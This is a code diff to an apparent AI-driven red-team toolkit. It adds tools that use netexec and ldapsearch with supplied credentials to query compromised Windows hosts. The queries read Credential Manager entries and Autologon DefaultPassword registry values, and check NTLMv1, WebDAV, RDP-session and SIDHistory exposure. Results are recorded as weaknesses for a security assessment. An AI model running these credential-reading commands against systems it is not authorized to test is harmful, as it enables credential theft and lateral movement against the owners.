@@ -89,7 +89,11 @@ def _track_cross_domain_reuse(state: RedTeamState, credential: Credential) -> No
         state.weaknesses.append(block)
 
 
-def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int]:
+def _run_tool(
+    cmd: list[str],
+    timeout_seconds: int = 300,
+    target_role: str | None = None,
+) -> tuple[str, str, int]:
     """Execute a command on the remote Kali attack box.
 
     Args:
@@ -99,7 +103,7 @@ def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int
     Returns:
         Tuple of (stdout, stderr, return_code)
     """
-    result = run_remote(cmd, timeout_seconds=timeout_seconds)
+    result = run_remote(cmd, timeout_seconds=timeout_seconds, target_role=target_role)
     return result.stdout, result.stderr, result.return_code
 
 
@@ -1347,6 +1351,289 @@ class CredentialDiscoveryTools(Toolset):
             return f"LAPS dump failed: {e}"
 
 
+class PostureValidationTools(Toolset):
+    """Tools for validating AD security posture on compromised hosts."""
+
+    state: RedTeamState | None = None
+
+    def set_state(self, state: RedTeamState) -> None:
+        """Set the operation state for this toolset."""
+        self.state = state
+
+    def _add_weakness(self, block: str) -> None:
+        if not self.state or not block:
+            return
+        if block not in self.state.weaknesses:
+            self.state.weaknesses.append(block)
+
+    def _build_netexec_cmd(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str,
+        command: str,
+    ) -> list[str]:
+        cmd = ["netexec", "smb", target, "-u", username, "-p", password]
+        if domain:
+            cmd.extend(["-d", domain])
+        cmd.extend(["-x", command])
+        return cmd
+
+    def _run_netexec_command(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str,
+        command: str,
+        timeout_seconds: int = 60,
+    ) -> str:
+        cmd = self._build_netexec_cmd(target, username, password, domain, command)
+        stdout, stderr, _ = _run_tool(cmd, timeout_seconds=timeout_seconds)
+        return (stdout or "") + ("\n" + stderr if stderr else "")
+
+    @dn.tool_method
+    def check_credman_entries(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str = "",
+    ) -> str:
+        """
+        Check for Credential Manager entries on a compromised host.
+
+        Args:
+            target: Target host
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication (optional)
+
+        Returns:
+            cmdkey output with any discovered entries
+        """
+        output = self._run_netexec_command(
+            target, username, password, domain, "cmdkey /list", timeout_seconds=90
+        )
+        targets = [
+            line.strip()
+            for line in output.splitlines()
+            if line.strip().lower().startswith("target:")
+        ]
+        if targets:
+            block = _format_weakness_block(
+                "Credential Manager Entries",
+                "Stored credentials in Windows Credential Manager",
+                {"Targets": ", ".join(targets)},
+                "Potential plaintext or reusable credentials",
+                "Remote cmdkey enumeration",
+            )
+            self._add_weakness(block)
+            return "Credential Manager entries found:\n" + output
+        return output or "No Credential Manager entries found"
+
+    @dn.tool_method
+    def check_autologon_registry(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str = "",
+    ) -> str:
+        """
+        Check Autologon registry keys for stored credentials.
+
+        Args:
+            target: Target host
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Registry query output with indicators highlighted
+        """
+        reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        cmd = (
+            f'reg query "{reg_path}" /v AutoAdminLogon & '
+            f'reg query "{reg_path}" /v DefaultUserName & '
+            f'reg query "{reg_path}" /v DefaultPassword'
+        )
+        output = self._run_netexec_command(target, username, password, domain, cmd)
+        auto_match = re.search(r"AutoAdminLogon\s+REG_\w+\s+(\S+)", output, re.IGNORECASE)
+        auto_value = auto_match.group(1) if auto_match else ""
+        auto_enabled = auto_value.strip().lower() in {"1", "0x1", "true", "yes"}
+        password_match = re.search(r"DefaultPassword\s+REG_\w+\s*(.*)", output, re.IGNORECASE)
+        password_value = password_match.group(1).strip() if password_match else ""
+        has_password = bool(password_value) and password_value.lower() not in {"(null)", "null"}
+        if has_password:
+            block = _format_weakness_block(
+                "Autologon Credentials",
+                "Autologon registry values present",
+                {
+                    "Registry Path": reg_path,
+                    "AutoAdminLogon": auto_value or "unknown",
+                },
+                "Potential plaintext password exposure",
+                "Remote registry query",
+            )
+            self._add_weakness(block)
+            if auto_enabled:
+                return "Autologon credentials detected:\n" + output
+            return "Autologon password present but AutoAdminLogon disabled:\n" + output
+        return output or "No Autologon credentials detected"
+
+    @dn.tool_method
+    def check_lm_compatibility_level(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str = "",
+    ) -> str:
+        """
+        Check LmCompatibilityLevel for NTLMv1 downgrade risk.
+
+        Args:
+            target: Target host
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Registry query output with interpreted risk
+        """
+        reg_path = r"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
+        cmd = f'reg query "{reg_path}" /v LmCompatibilityLevel'
+        output = self._run_netexec_command(target, username, password, domain, cmd)
+        match = re.search(
+            r"LmCompatibilityLevel\s+REG_DWORD\s+0x([0-9a-fA-F]+)", output, re.IGNORECASE
+        )
+        if match:
+            level = int(match.group(1), 16)
+            if level <= 2:
+                block = _format_weakness_block(
+                    "NTLMv1 Downgrade Allowed",
+                    "LmCompatibilityLevel permits NTLMv1",
+                    {"LmCompatibilityLevel": f"{level}"},
+                    "Increases risk of NTLMv1 downgrade attacks",
+                    "Remote registry query",
+                )
+                self._add_weakness(block)
+                return f"NTLMv1 allowed (LmCompatibilityLevel={level}):\n" + output
+            return f"LmCompatibilityLevel={level} (NTLMv1 restricted):\n" + output
+        return output or "LmCompatibilityLevel not found"
+
+    @dn.tool_method
+    def check_webclient_service(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str = "",
+    ) -> str:
+        """
+        Check WebClient (WebDAV) service status for relay attacks.
+
+        Args:
+            target: Target host
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Service configuration and status output
+        """
+        cmd = "sc qc WebClient & sc query WebClient"
+        output = self._run_netexec_command(target, username, password, domain, cmd)
+        if "START_TYPE" in output and "DISABLED" not in output.upper():
+            block = _format_weakness_block(
+                "WebDAV Client Enabled",
+                "WebClient service is enabled",
+                {"Service": "WebClient"},
+                "Enables WebDAV relay/coercion paths",
+                "Remote service query",
+            )
+            self._add_weakness(block)
+            return "WebClient service enabled:\n" + output
+        return output or "WebClient service not enabled"
+
+    @dn.tool_method
+    def check_rdp_sessions(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str = "",
+    ) -> str:
+        """
+        Check for active RDP sessions (potential credential theft targets).
+
+        Args:
+            target: Target host
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Session query output
+        """
+        output = self._run_netexec_command(target, username, password, domain, "quser")
+        if "rdp" in output.lower():
+            return "RDP sessions detected:\n" + output
+        return output or "No RDP sessions detected"
+
+    @dn.tool_method
+    def check_sidhistory(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str,
+    ) -> str:
+        """
+        Check for accounts with SIDHistory (privilege escalation vector).
+
+        Args:
+            target: Domain controller IP address
+            username: Username for LDAP authentication
+            password: Password for authentication
+            domain: Target domain (e.g., 'example.local')
+
+        Returns:
+            LDAP output listing accounts with sidHistory
+        """
+        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])
+        cmd = [
+            "ldapsearch",
+            "-x",
+            "-H",
+            f"ldap://{target}",
+            "-D",
+            f"{username}@{domain}",
+            "-w",
+            password,
+            "-b",
+            base_dn,
+            "(sidHistory=*)",
+            "sAMAccountName",
+            "sidHistory",
+        ]
+        stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=120)
+        output = (stdout or "") + ("\n" + stderr if stderr else "")
+        if "sAMAccountName" in output:
+            block = _format_weakness_block(
+                "SIDHistory Enabled",
+                "Accounts with SIDHistory present",
+                {},
+                "Potential SIDHistory abuse for elevated access",
+                "LDAP enumeration",
+            )
+            self._add_weakness(block)
+            return "SIDHistory entries detected:\n" + output
+        return output or "No SIDHistory entries detected"
+
+
 class CredentialHarvestingTools(Toolset):
     """Tools for harvesting credentials via Active Directory attacks."""
 
@@ -2320,7 +2607,7 @@ class BloodHoundTools(Toolset):
 
         try:
             logger.info(f"[*] Running BloodHound collection for {domain}")
-            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=600)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=600, target_role="recon")
 
             raw_output = stdout + "\n" + (stderr or "")
 
